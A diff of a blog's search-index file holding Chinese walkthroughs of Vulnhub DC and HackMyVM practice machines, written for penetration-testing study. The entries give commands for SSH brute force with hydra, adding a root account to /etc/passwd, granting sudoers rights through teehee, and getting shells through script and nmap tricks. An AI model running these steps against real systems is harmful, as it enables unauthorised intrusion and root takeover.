@@ -6,6 +6,32 @@
     <content><![CDATA[]]></content>
   </entry>
   <entry>
+    <title>HMV-Alzheimer</title>
+    <url>/posts/16384.html</url>
+    <content><![CDATA[<p>HMV-Alzheimer靶场复盘</p>
+<span id="more"></span>
+<p><img src="https://pic1.imgdb.cn/item/679a35f1d0e0a243d4f878cb.png"></p>
+<h1 id="Alzheimer"><a href="#Alzheimer" class="headerlink" title="Alzheimer"></a>Alzheimer</h1><h2 id="端口扫描-信息收集"><a href="#端口扫描-信息收集" class="headerlink" title="端口扫描&#x2F;信息收集"></a>端口扫描&#x2F;信息收集</h2><p> <img src="https://pic1.imgdb.cn/item/679a400bd0e0a243d4f87a4b.png"><br>三个端口  只有21端口现在是开放的  80和22都是有防火墙<br>先尝试能不能匿名登录ftp  然后上传反弹shell文件<br><img src="https://pic1.imgdb.cn/item/679a4010d0e0a243d4f87a4c.png"><br>发现有一个.secretnote.txt 下载到本地查看<br><img src="https://pic1.imgdb.cn/item/679a4014d0e0a243d4f87a4d.png"><br>提示我们要用knock服务 按这个顺序发送请求包才能打开端口</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="YAML"><figure class="iseeu highlight /yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">┌──(root㉿kakeru)-[~/alz]</span></span><br><span class="line"><span class="string">└─#</span> <span class="string">knock</span> <span class="string">-u</span> <span class="number">192.168</span><span class="number">.240</span><span class="number">.125</span> <span class="number">1000 </span><span class="number">2000 </span><span class="number">3000</span></span><br></pre></td></tr></table></figure></div>
+<p>但是敲门之后还是无法打开两个端口  查了wp  发现和橘墨大佬的问题一样 因为我修改过网卡，所以去修改靶机的knockd配置文件<br><img src="https://pic1.imgdb.cn/item/679a4014d0e0a243d4f87a4e.png" alt="|500"><br><code>service knockd restart</code><br><img src="https://pic1.imgdb.cn/item/679a403ed0e0a243d4f87a59.png"><br>修改配置文件之后在knock就可以访问80端口了</p>
+<h2 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h2><p><img src="https://pic1.imgdb.cn/item/679a403fd0e0a243d4f87a5a.png"><br>提示密码存在一个.txt文件中  用户名是 medusa   并且给了一个摩丝密码 nothing<br>现在进行目录扫描<br><img src="https://pic1.imgdb.cn/item/679a4044d0e0a243d4f87a5b.png"><br>这里给了三个重定向的目录 一次访问试试</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GHERKIN"><figure class="iseeu highlight /gherkin"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/alz]</span><br><span class="line">└─<span class="comment"># curl 192.168.240.224/secret/</span></span><br><span class="line">Maybe my password is in this secret folder?</span><br><span class="line">┌──(root㉿kakeru)-[~/alz]</span><br><span class="line">└─<span class="comment"># curl 192.168.240.224/home/  </span></span><br><span class="line">Maybe my pass is at home!</span><br><span class="line">-medusa</span><br><span class="line">┌──(root㉿kakeru)-[~/alz]</span><br><span class="line">└─<span class="comment"># curl 192.168.240.224/admin/</span></span><br><span class="line"><span class="variable">&lt;html&gt;</span></span><br><span class="line"><span class="variable">&lt;head&gt;</span><span class="variable">&lt;title&gt;</span>403 Forbidden<span class="variable">&lt;/title&gt;</span><span class="variable">&lt;/head&gt;</span></span><br><span class="line"><span class="variable">&lt;body bgcolor=&quot;white&quot;&gt;</span></span><br><span class="line"><span class="variable">&lt;center&gt;</span><span class="variable">&lt;h1&gt;</span>403 Forbidden<span class="variable">&lt;/h1&gt;</span><span class="variable">&lt;/center&gt;</span></span><br><span class="line"><span class="variable">&lt;hr&gt;</span><span class="variable">&lt;center&gt;</span>nginx/1.14.2<span class="variable">&lt;/center&gt;</span></span><br><span class="line"><span class="variable">&lt;/body&gt;</span></span><br><span class="line"><span class="variable">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>提示密码在secret目录中 又在文件home中所以访问&#x2F;secret&#x2F;home&#x2F;</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APPLESCRIPT"><figure class="iseeu highlight /applescript"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/alz]</span><br><span class="line">└─<span class="comment"># curl 192.168.240.224/secret/home/</span></span><br><span class="line"></span><br><span class="line">Im trying a lot. Im sure <span class="keyword">that</span> i will recover <span class="keyword">my</span> pass!</span><br><span class="line"></span><br><span class="line">-medusa</span><br></pre></td></tr></table></figure></div>
+<p>还是没有直接的密码<br>没有思路查看wp后才知道密码藏在ftp里面 但是是在knock之后过的ftp中  这个老六。。。<br><img src="https://pic1.imgdb.cn/item/679a4045d0e0a243d4f87a5d.png"><br>这个就是medusa的密码<br><img src="https://pic1.imgdb.cn/item/679a4047d0e0a243d4f87a5e.png"><br>拿到shell</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="https://pic1.imgdb.cn/item/679a407ed0e0a243d4f87a61.png"><br>发现有sudo命令  但是这个无法提权<br>继续查suid文件<br><img src="https://pic1.imgdb.cn/item/679a4083d0e0a243d4f87a64.png"><br>搜索都可以用capsh提权<br><img src="https://pic1.imgdb.cn/item/679a407fd0e0a243d4f87a62.png"><br><img src="https://pic1.imgdb.cn/item/679a4082d0e0a243d4f87a63.png"><br>拿到flag</p>
+<p>密码存在knock之后的ftp的文件中也太阴险了。。。</p>
+]]></content>
+      <categories>
+        <category>靶场</category>
+        <category>hmv</category>
+      </categories>
+      <tags>
+        <tag>-渗透 -hmv</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>DC1靶场复盘</title>
     <url>/posts/52872.html</url>
     <content><![CDATA[<p>vulnhub-DC1靶场复盘</p>
@@ -21,22 +47,6 @@
       <tags>
         <tag>渗透</tag>
         <tag>vulnhub</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>HMV-Alzheimer</title>
-    <url>/posts/16384.html</url>
-    <content><![CDATA[<p>HMV-Alzheimer靶场复盘</p>
-<span id="more"></span>
-
-<p><img src="https://pic1.imgdb.cn/item/679a35f1d0e0a243d4f878cb.png"></p>
-]]></content>
-      <categories>
-        <category>靶场</category>
-        <category>hmv</category>
-      </categories>
-      <tags>
-        <tag>-渗透 -hmv</tag>
       </tags>
   </entry>
   <entry>
@@ -78,31 +88,6 @@
       </tags>
   </entry>
   <entry>
-    <title>DC4靶场复盘</title>
-    <url>/posts/52100.html</url>
-    <content><![CDATA[<p>vulnhub-DC4靶场复盘</p>
-<span id="more"></span>
-<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>这个靶机开放80和22端口   没有什么多余信息</p>
-<h2 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h2><p><img src="https://pic1.imgdb.cn/item/679a1f99d0e0a243d4f87640.png" alt="|400"><br>只有一个登录界面  只能爆破  用bp爆破得到admin密码 登入管理员界面<br><img src="https://pic1.imgdb.cn/item/679a20f5d0e0a243d4f87658.png" alt="|500"><br><img src="https://pic1.imgdb.cn/item/679a20f6d0e0a243d4f87659.png" alt="|825"><br>这里的界面可以运行一些shell的指令 猜测在页面的请求包里面有指令 用bp试试<br><img src="https://pic1.imgdb.cn/item/679a20f7d0e0a243d4f8765a.pngg" alt="500"><br>发现果然是  空格用+绕过 现在就把指令变成反弹shell  拿到www的shell</p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>这题提权方式有很多种</p>
-<h3 id="1用exim漏洞"><a href="#1用exim漏洞" class="headerlink" title="1用exim漏洞"></a>1用exim漏洞</h3><p>步骤和DC8一模一样</p>
-<h3 id="2访问不同用户的信息"><a href="#2访问不同用户的信息" class="headerlink" title="2访问不同用户的信息"></a>2访问不同用户的信息</h3><p><img src="https://pic1.imgdb.cn/item/679a20f8d0e0a243d4f8765b.png"><br>在home目录下面有三个用户<br><img src="https://pic1.imgdb.cn/item/679a2129d0e0a243d4f8765e.png" alt="|500"><br>jim这里有一个只有jim可以读写的文件 肯定有东西   在目录backups下面有一些密码<br>现在用爆破看看是否能登录jim的ssh<br>通过hydra成功进入ssh <code>hydra -l jim -P pass.txt ssh://192.168.240.249</code><br><img src="https://pic1.imgdb.cn/item/679a2129d0e0a243d4f8765f.png"><br>登录到jim看到mbox中的内容是一封邮件 但是没有什么有用的信息<br>到&#x2F;var&#x2F;mail路径下 看到有一个jim邮件  里面有另一个用户的密码  登录到charles中 (这里邮件中的C是大写的 但是登录ssh要用小写c不知道为什么)<br><img src="https://pic1.imgdb.cn/item/679a212ad0e0a243d4f87660.png" alt="|500"><br>发现这个用户有一个用root执行teehee的权限<br>有两种方式用teehee提权  一种是<br> <code>echo &quot;raaj::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd</code><br><mark>可以看到teehee可以把一个语句加到某个文件里面</mark>  这里是新建了一个用户有了root权限<br>也可以用teehee把charles变成一个超级用户 写到&#x2F;etc&#x2F;sudoers 中<br> <code>echo &quot;charles ALL=(ALL:ALL) ALL&quot; | sudo teehee -a /etc/sudoers</code><br>这里sudo要写在分隔符后面 因为是有root权限执行teehee</p>
-<h2 id="用test-sh"><a href="#用test-sh" class="headerlink" title="用test.sh"></a>用test.sh</h2><p>刚才jim目录下有一个test.sh 文件 权限是-rwsrwxrwx<br><img src="https://pic1.imgdb.cn/item/679a212ad0e0a243d4f87661.png" alt="|500"><br><strong>SUID (Set User ID)</strong>：</p>
-<ul>
-<li>当文件的执行权限中出现 <code>s</code> （在所有者权限位置），表示该文件是设置了 SUID 权限。SUID 权限让用户执行这个文件时，程序以文件所有者的权限运行，而不是以执行它的用户的权限运行。</li>
-<li>例如，如果文件的所有者是 <code>root</code>，那么无论哪个用户执行该文件，都会以 <code>root</code> 权限运行它。<br>所以可以在文件后面加上一句反弹shell  用root身份执行 就可以拿到rootshell<br><img src="https://pic1.imgdb.cn/item/679a212bd0e0a243d4f87662.png"></li>
-</ul>
-]]></content>
-      <categories>
-        <category>靶场</category>
-        <category>vulnhub</category>
-      </categories>
-      <tags>
-        <tag>渗透</tag>
-        <tag>vulnhub</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>DC5靶场复盘</title>
     <url>/posts/19078.html</url>
     <content><![CDATA[<p>vulnhub-DC5靶场复盘</p>
@@ -110,27 +95,6 @@
 <h2 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h2><p>这题的靶场提示要在web找到刷新改变的东西<br><img src="https://pic1.imgdb.cn/item/679a1f6ed0e0a243d4f87639.png"><br>这个靶机只有一个80端口 没有22ssh端口<br>而且这个网站没有用cms  是一个静态的页面</p>
 <h2 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h2><p>在contact us 里有输入框 用sqlmap 扫描之后没有注入点<br>在contact us 输入内容返回的thank you.php 界面刷新 发现下面的footer会刷新 查看页面源代码<br><img src="https://pic1.imgdb.cn/item/679a1f6fd0e0a243d4f8763a.png" alt="|450"><br>这个界面是有一个footer.php的 所以这里有一个文件包含漏洞  因为是其他有调用这个footer.php<br>但是现在不知道用什么关键字访问到包含文件  所以我们用wfuzz跑关键字<br><img src="https://pic1.imgdb.cn/item/679a1f6fd0e0a243d4f8763b.png" alt="|575"><br><img src="https://pic1.imgdb.cn/item/679a1f70d0e0a243d4f8763c.png"><br>找到了关键字是file  现在就可以访问服务器中的文件了   <strong>现在的又一个难题是只能看到文件如何才能拿到shell呢</strong><br>我们知道如果可以写入一个一句话木马就可以拿到shell   但是应该用什么方式实现呢？<br>用apache2服务访问的日志 错误日志也会存 存在&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log 中  这里没有我们就用nginx<br>下一步就是用bp修改<br><img src="https://pic1.imgdb.cn/item/679a1f70d0e0a243d4f8763c.png" alt="|425"><br>这一条记录会在access.log中<br><img src="https://pic1.imgdb.cn/item/679a1f98d0e0a243d4f8763e.png"><br>我们的标记存在 而且后面的php代码没有显示出来 说明被成功解析了  用蚁剑连接shell</p>
 <h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>在上一步拿到蚁剑的shell之后反弹到本机中<br>提权思路还是找到存在漏洞的服务<br><img src="https://pic1.imgdb.cn/item/679a1f98d0e0a243d4f8763f.png" alt="|450"><br>这里有一个screen服务而且告诉了版本号 大概率就是利用这个<br>然后用wget 从靶机下载本机的这个脚本  <mark>注意这个脚本不能再www目录下运行  在其他目录下wget</mark><br>运行之后拿到root权限 解决！！！ </p>
-]]></content>
-      <categories>
-        <category>靶场</category>
-        <category>vulnhub</category>
-      </categories>
-      <tags>
-        <tag>渗透</tag>
-        <tag>vulnhub</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>DC6靶场复盘</title>
-    <url>/posts/35203.html</url>
-    <content><![CDATA[<p>vulnhub-DC6靶场复盘</p>
-<span id="more"></span>
-
-<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>首先要根据vulnhub上面的提示  修改本机和kali的host文件<br>给了一个提示<br><img src="https://pic1.imgdb.cn/item/679a1d0ed0e0a243d4f875f5.png"><br>让我们扫描 先把指定的密码字典存起来   我们用bp爆破管理员账户</p>
-<h2 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h2><p>这个站点是用wordpress创建的 可以访问readme.html 就可以看到哪里是登录界面 一般还会有版本信息<br><img src="https://pic1.imgdb.cn/item/679a1d0ed0e0a243d4f875f6.png" alt="|450"></p>
-<p>后台登录界面就在&#x2F;wp-admin  现在就是爆破 用admin爆破    我们尝试了爆破 但是无法得到密码<br>现在用wpscan扫描 指定url 和apitoken    然后枚举用户名   <code>wpscan --url wordy --enumerate u</code><br>然后把得到的用户名存在一个文件里面  爆破用户名和密码 </p>
-<p>接着就可以登录到管理员账户<br>然后利用web上的信息拿到shell 这里要用到插件的activity monitor 插件漏洞 用searchsploit<br><img src="https://pic1.imgdb.cn/item/679a1d14d0e0a243d4f875f7.png" alt="|500"><br>利用这个漏洞   修改payload 上传到本机 在web端访问<br><img src="https://pic1.imgdb.cn/item/679a1d16d0e0a243d4f875f8.png" alt="|425"><br>然后在web端点击这个文件 就可以拿到shell<br><img src="https://pic1.imgdb.cn/item/679a1d17d0e0a243d4f875f9.png"></p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>这个www用户目录下面其实没有什么有用的东西   &#x3D;&#x3D;去&#x2F;home&#x2F;&#x3D;&#x3D; 目录下   这里可以看到其他几个用户的文件夹<br>找到jens用户 目录下有一个backup.sh<br><code>ls -al backups.sh</code><br><code>-rwxrwxr-x 1 jens devs 50 Apr 26  2019 backups.sh</code><br>可以看到devs组的人有rwx权限 所有用户都有x权限<br>然后在mark用户的文件夹下面有一个stuff文件夹 里面有一个账号密码 可以登录到ssh<br><img src="https://pic1.imgdb.cn/item/679a1d5cd0e0a243d4f87600.png"><br><code>graham@dc-6:~$ id</code><br><code>uid=1001(graham) gid=1001(graham) groups=1001(graham),1005(devs)</code><br>这个用户是属于devs这个组的 所以有写入文件的权限<br><img src="https://pic1.imgdb.cn/item/679a1d5dd0e0a243d4f87601.png" alt="|500"><br>可以发现这个用户可以不用密码就用jens用户的名义执行刚才的那个脚本<br>我们先在那个脚本文件后面加上<code>graham@dc-6:~$ echo &quot;/bin/bash&quot; &gt;&gt; /home/jens/backups.sh</code><br>这样子就可以让执行脚本的人返回shell   这样子就拿到了jens的shell<br><img src="https://pic1.imgdb.cn/item/679a1d5dd0e0a243d4f87602.png" alt="|450"><br>这个用户可以用root身份执行 nmap  所以用nmap提权<br>在网上找资料后 发现nmap可以用srcipt提权<br><img src="https://pic1.imgdb.cn/item/679a1d9dd0e0a243d4f87604.png" alt="|500"><br>或者可以把’os.execute(“&#x2F;bin&#x2F;bash”) 写到一个s.nse文件里 然后–script 传入这个文件</p>
 ]]></content>
       <categories>
         <category>靶场</category>
@@ -152,24 +116,6 @@
 <h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="https://pic1.imgdb.cn/item/679a1814d0e0a243d4f8758a.png" alt="|575"><br>发现有一个叫做mbox的文件 里面是root发送的 并且好像每十五分钟发送一次<br>看一下这里的sh里有什么内容</p>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">dc7user@dc-7:~$ <span class="built_in">cat</span> /opt/scripts/backups.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="built_in">rm</span> /home/dc7user/backups/*</span><br><span class="line"><span class="built_in">cd</span> /var/www/html/</span><br><span class="line">drush sql-dump --result-file=/home/dc7user/backups/website.sql</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">tar -czf /home/dc7user/backups/website.tar.gz html/</span><br><span class="line">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql</span><br><span class="line">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz</span><br><span class="line"><span class="built_in">chown</span> dc7user:dc7user /home/dc7user/backups/*</span><br><span class="line"><span class="built_in">rm</span> /home/dc7user/backups/website.sql</span><br><span class="line"><span class="built_in">rm</span> /home/dc7user/backups/website.tar.gz</span><br><span class="line">You have new mail <span class="keyword">in</span> /var/mail/dc7user</span><br></pre></td></tr></table></figure></div>
 <p>这里看到有用到drush这个服务<br><img src="https://pic1.imgdb.cn/item/679a1815d0e0a243d4f8758e.png"><br>而且可以看到这个文件的属主是root  只有www-data这个用户可以写入 我们只有一个读权限<br>现在我们的目标就是把root的shell用nc -e 反弹到本机  就是把这个语句写到这个脚本里面让他执行<br>现在的目的就是如何拿到www-data的shell   <mark>用drush</mark><br>根据搜索的知识 drush一般要在站点所在的目录下操作<br><code>cd /var/www/html     drush user-information admin </code><br> 可以查到管理的信息<br>然后再修改管理的密码 登录到web里面<br><img src="https://pic1.imgdb.cn/item/679a1816d0e0a243d4f87590.png" alt="|475"><br>但是发现这里和上一个靶机不一样 没有php的选项    搜索资料知道可以去下载插件<br>在网页上用php代码 写上反弹shell<br>现在就是用这个www用户把反弹shell语句写到刚才的那个脚本中  然后等到十五分的时候自动执行<br>完成！！ </p>
-]]></content>
-      <categories>
-        <category>靶场</category>
-        <category>vulnhub</category>
-      </categories>
-      <tags>
-        <tag>渗透</tag>
-        <tag>vulnhub</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>DC8靶场复盘</title>
-    <url>/posts/51727.html</url>
-    <content><![CDATA[<p>vulnhub-DC8靶场复盘</p>
-<span id="more"></span>
-<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>这个主要考察从web端进入</p>
-<h1 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h1><p>0.用dirsearch找到网页所有的目录  知道有mysql服务 暗示要sql注入  而且有robots.txt 其中有user&#x2F;login目录<br>1.在网页点击其他链接的时候看到url有参数 尝试注释闭合<br>发现有sql注入点<br><img src="https://pic1.imgdb.cn/item/679a1620d0e0a243d4f87546.png" alt="|550"><br>2.用sqlmap得到管理员账号<br><img src="https://pic1.imgdb.cn/item/679a1620d0e0a243d4f87547.png" alt="|500"><br>最终找到两条记录 然后将这个hash放到一个目录用john 去跑 可以找到john的密码<br>3.登录网站管理员的账号<br>有一个edit选项 里面可以上传文件 但是无法上传php文件<br><img src="https://pic1.imgdb.cn/item/679a1621d0e0a243d4f87548.png" alt="|500"><br>在contactus webform 发现可以修改用户上传之后的提示回显  并且可以用PHP代码 实验之后发现确实可以渲染php<br>现在可以用system指令来反弹shell<br><img src="https://pic1.imgdb.cn/item/679a1621d0e0a243d4f87549.png" alt="|525"><br><img src="https://pic1.imgdb.cn/item/679a1622d0e0a243d4f8754a.png"><br>这个指令可以在反弹的shell里面加上前缀 可以美化输出<br>随便看看这个用户目录下的文件 </p>
-<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null  意思从根目录开始找 所有者是root 只包括suid 的 然后将标准错误不输出<br><img src="https://pic1.imgdb.cn/item/679a1666d0e0a243d4f8754f.png" alt="|500"><br>这里利用exim提权（先查看这里exim4的版本  用searchsploit exim发现漏洞<br>然后把文件复制到&#x2F;var&#x2F;www&#x2F;html 下方便传输到受害机<br><img src="https://pic1.imgdb.cn/item/679a1669d0e0a243d4f87550.png" alt="|425"><br>在受害机上面用wget接受这个脚本<br><img src="https://pic1.imgdb.cn/item/679a166ad0e0a243d4f87551.png"><br><img src="https://pic1.imgdb.cn/item/679a166bd0e0a243d4f87552.png"><br>有两种方法使用这个脚本 选择第二种 因为 第二种在脚本说可以有一个shell<br>但是如果我们用 cat -A 查看这个a.sh 文件发现 末尾都是^M<br>用dos2unix转换之后 可以运行   bash a.sh -m netcat<br><img src="https://pic1.imgdb.cn/item/679a166cd0e0a243d4f87553.png" alt="|450"><br>发现成功提权 然后到&#x2F;root目录下 就解决！！ </p>
 ]]></content>
       <categories>
         <category>靶场</category>
@@ -226,6 +172,31 @@
       </tags>
   </entry>
   <entry>
+    <title>DC4靶场复盘</title>
+    <url>/posts/52100.html</url>
+    <content><![CDATA[<p>vulnhub-DC4靶场复盘</p>
+<span id="more"></span>
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>这个靶机开放80和22端口   没有什么多余信息</p>
+<h2 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h2><p><img src="https://pic1.imgdb.cn/item/679a1f99d0e0a243d4f87640.png" alt="|400"><br>只有一个登录界面  只能爆破  用bp爆破得到admin密码 登入管理员界面<br><img src="https://pic1.imgdb.cn/item/679a20f5d0e0a243d4f87658.png" alt="|500"><br><img src="https://pic1.imgdb.cn/item/679a20f6d0e0a243d4f87659.png" alt="|825"><br>这里的界面可以运行一些shell的指令 猜测在页面的请求包里面有指令 用bp试试<br><img src="https://pic1.imgdb.cn/item/679a20f7d0e0a243d4f8765a.pngg" alt="500"><br>发现果然是  空格用+绕过 现在就把指令变成反弹shell  拿到www的shell</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>这题提权方式有很多种</p>
+<h3 id="1用exim漏洞"><a href="#1用exim漏洞" class="headerlink" title="1用exim漏洞"></a>1用exim漏洞</h3><p>步骤和DC8一模一样</p>
+<h3 id="2访问不同用户的信息"><a href="#2访问不同用户的信息" class="headerlink" title="2访问不同用户的信息"></a>2访问不同用户的信息</h3><p><img src="https://pic1.imgdb.cn/item/679a20f8d0e0a243d4f8765b.png"><br>在home目录下面有三个用户<br><img src="https://pic1.imgdb.cn/item/679a2129d0e0a243d4f8765e.png" alt="|500"><br>jim这里有一个只有jim可以读写的文件 肯定有东西   在目录backups下面有一些密码<br>现在用爆破看看是否能登录jim的ssh<br>通过hydra成功进入ssh <code>hydra -l jim -P pass.txt ssh://192.168.240.249</code><br><img src="https://pic1.imgdb.cn/item/679a2129d0e0a243d4f8765f.png"><br>登录到jim看到mbox中的内容是一封邮件 但是没有什么有用的信息<br>到&#x2F;var&#x2F;mail路径下 看到有一个jim邮件  里面有另一个用户的密码  登录到charles中 (这里邮件中的C是大写的 但是登录ssh要用小写c不知道为什么)<br><img src="https://pic1.imgdb.cn/item/679a212ad0e0a243d4f87660.png" alt="|500"><br>发现这个用户有一个用root执行teehee的权限<br>有两种方式用teehee提权  一种是<br> <code>echo &quot;raaj::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd</code><br><mark>可以看到teehee可以把一个语句加到某个文件里面</mark>  这里是新建了一个用户有了root权限<br>也可以用teehee把charles变成一个超级用户 写到&#x2F;etc&#x2F;sudoers 中<br> <code>echo &quot;charles ALL=(ALL:ALL) ALL&quot; | sudo teehee -a /etc/sudoers</code><br>这里sudo要写在分隔符后面 因为是有root权限执行teehee</p>
+<h2 id="用test-sh"><a href="#用test-sh" class="headerlink" title="用test.sh"></a>用test.sh</h2><p>刚才jim目录下有一个test.sh 文件 权限是-rwsrwxrwx<br><img src="https://pic1.imgdb.cn/item/679a212ad0e0a243d4f87661.png" alt="|500"><br><strong>SUID (Set User ID)</strong>：</p>
+<ul>
+<li>当文件的执行权限中出现 <code>s</code> （在所有者权限位置），表示该文件是设置了 SUID 权限。SUID 权限让用户执行这个文件时，程序以文件所有者的权限运行，而不是以执行它的用户的权限运行。</li>
+<li>例如，如果文件的所有者是 <code>root</code>，那么无论哪个用户执行该文件，都会以 <code>root</code> 权限运行它。<br>所以可以在文件后面加上一句反弹shell  用root身份执行 就可以拿到rootshell<br><img src="https://pic1.imgdb.cn/item/679a212bd0e0a243d4f87662.png"></li>
+</ul>
+]]></content>
+      <categories>
+        <category>靶场</category>
+        <category>vulnhub</category>
+      </categories>
+      <tags>
+        <tag>渗透</tag>
+        <tag>vulnhub</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>HMV-Connection</title>
     <url>/posts/10052.html</url>
     <content><![CDATA[<p>HMV-Connection靶场复盘</p>
@@ -248,18 +219,24 @@
       </tags>
   </entry>
   <entry>
-    <title>HMV-Hommie</title>
-    <url>/posts/61994.html</url>
-    <content><![CDATA[<p>HMV-Hommie靶场复盘</p>
+    <title>DC6靶场复盘</title>
+    <url>/posts/35203.html</url>
+    <content><![CDATA[<p>vulnhub-DC6靶场复盘</p>
 <span id="more"></span>
-<p><img src="https://pic1.imgdb.cn/item/679a35f8d0e0a243d4f878cf.png"></p>
+
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>首先要根据vulnhub上面的提示  修改本机和kali的host文件<br>给了一个提示<br><img src="https://pic1.imgdb.cn/item/679a1d0ed0e0a243d4f875f5.png"><br>让我们扫描 先把指定的密码字典存起来   我们用bp爆破管理员账户</p>
+<h2 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h2><p>这个站点是用wordpress创建的 可以访问readme.html 就可以看到哪里是登录界面 一般还会有版本信息<br><img src="https://pic1.imgdb.cn/item/679a1d0ed0e0a243d4f875f6.png" alt="|450"></p>
+<p>后台登录界面就在&#x2F;wp-admin  现在就是爆破 用admin爆破    我们尝试了爆破 但是无法得到密码<br>现在用wpscan扫描 指定url 和apitoken    然后枚举用户名   <code>wpscan --url wordy --enumerate u</code><br>然后把得到的用户名存在一个文件里面  爆破用户名和密码 </p>
+<p>接着就可以登录到管理员账户<br>然后利用web上的信息拿到shell 这里要用到插件的activity monitor 插件漏洞 用searchsploit<br><img src="https://pic1.imgdb.cn/item/679a1d14d0e0a243d4f875f7.png" alt="|500"><br>利用这个漏洞   修改payload 上传到本机 在web端访问<br><img src="https://pic1.imgdb.cn/item/679a1d16d0e0a243d4f875f8.png" alt="|425"><br>然后在web端点击这个文件 就可以拿到shell<br><img src="https://pic1.imgdb.cn/item/679a1d17d0e0a243d4f875f9.png"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>这个www用户目录下面其实没有什么有用的东西   &#x3D;&#x3D;去&#x2F;home&#x2F;&#x3D;&#x3D; 目录下   这里可以看到其他几个用户的文件夹<br>找到jens用户 目录下有一个backup.sh<br><code>ls -al backups.sh</code><br><code>-rwxrwxr-x 1 jens devs 50 Apr 26  2019 backups.sh</code><br>可以看到devs组的人有rwx权限 所有用户都有x权限<br>然后在mark用户的文件夹下面有一个stuff文件夹 里面有一个账号密码 可以登录到ssh<br><img src="https://pic1.imgdb.cn/item/679a1d5cd0e0a243d4f87600.png"><br><code>graham@dc-6:~$ id</code><br><code>uid=1001(graham) gid=1001(graham) groups=1001(graham),1005(devs)</code><br>这个用户是属于devs这个组的 所以有写入文件的权限<br><img src="https://pic1.imgdb.cn/item/679a1d5dd0e0a243d4f87601.png" alt="|500"><br>可以发现这个用户可以不用密码就用jens用户的名义执行刚才的那个脚本<br>我们先在那个脚本文件后面加上<code>graham@dc-6:~$ echo &quot;/bin/bash&quot; &gt;&gt; /home/jens/backups.sh</code><br>这样子就可以让执行脚本的人返回shell   这样子就拿到了jens的shell<br><img src="https://pic1.imgdb.cn/item/679a1d5dd0e0a243d4f87602.png" alt="|450"><br>这个用户可以用root身份执行 nmap  所以用nmap提权<br>在网上找资料后 发现nmap可以用srcipt提权<br><img src="https://pic1.imgdb.cn/item/679a1d9dd0e0a243d4f87604.png" alt="|500"><br>或者可以把’os.execute(“&#x2F;bin&#x2F;bash”) 写到一个s.nse文件里 然后–script 传入这个文件</p>
 ]]></content>
       <categories>
         <category>靶场</category>
-        <category>hmv</category>
+        <category>vulnhub</category>
       </categories>
       <tags>
-        <tag>-渗透 -hmv</tag>
+        <tag>渗透</tag>
+        <tag>vulnhub</tag>
       </tags>
   </entry>
   <entry>
@@ -303,6 +280,42 @@
       </categories>
       <tags>
         <tag>-渗透 -hmv</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HMV-Hommie</title>
+    <url>/posts/61994.html</url>
+    <content><![CDATA[<p>HMV-Hommie靶场复盘</p>
+<span id="more"></span>
+<p><img src="https://pic1.imgdb.cn/item/679a35f8d0e0a243d4f878cf.png"></p>
